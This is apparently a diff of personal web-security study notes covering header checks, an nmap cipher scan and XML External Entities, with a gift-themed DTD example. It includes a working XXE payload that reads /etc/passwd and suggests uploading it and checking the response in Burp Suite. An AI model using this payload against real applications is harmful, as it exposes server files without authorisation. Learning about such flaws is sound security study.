@@ -79,9 +79,50 @@ Worth checking the headers. A useful tool is securityheaders.com
 
 We should also be checking the encryption on the domain. We can use nmap.
 
-4. XML External Entities (XXE)
-
-
-
 syntax: nmap --script=ssl-enum-ciphers -p 443 domain
 
+4. XML External Entities (XXE)
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#classic-xxe
+
+<?xml version="1.0" encoding="ISO-8859-1"?> #This is the XML header
+
+<!DOCTYPE gift [ 
+	<!ENTITY from "Kim">  #This is is a bit like a variable and we can call it, which means we dont have to type everything out all the time. This is a DTD. 
+]>
+
+<gift> #This is the root element
+	<To>Frank</To> # These three are the children elements
+	<From>&from;</From>  # We are now calling the entity here.
+	<Item>Pokemon Cards</Item>
+
+</gift>
+
+Now, if we added an additional name in the from with a special character, it would break the code. But, if we add it in the entity, it would work. Which means that we could add malicious code in the entity as an addition and that would probably work. 
+
+<?xml version="1.0" encoding="ISO-8859-1"?> #This is the XML header
+
+<!DOCTYPE gift [ 
+	<!ENTITY from "Kim&Carla"> 
+]>
+
+<gift> #This is the root element
+	<To>Frank</To> # These three are the children elements
+	<From>&from;</From>  # We are now calling the entity here.
+	<Item>Pokemon Cards</Item>
+
+</gift>
+
+Classic XXE payload 
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+  
+ We can use the above as a file in an upload section of the web app and with Burp Suite we can see the response from the server and see if the system is vulnerable to DTD. DTD needs to be disabled, otherwise this problem will occur. 
+ 
+ 5. Broken Access Control
+ 
+ 
+  
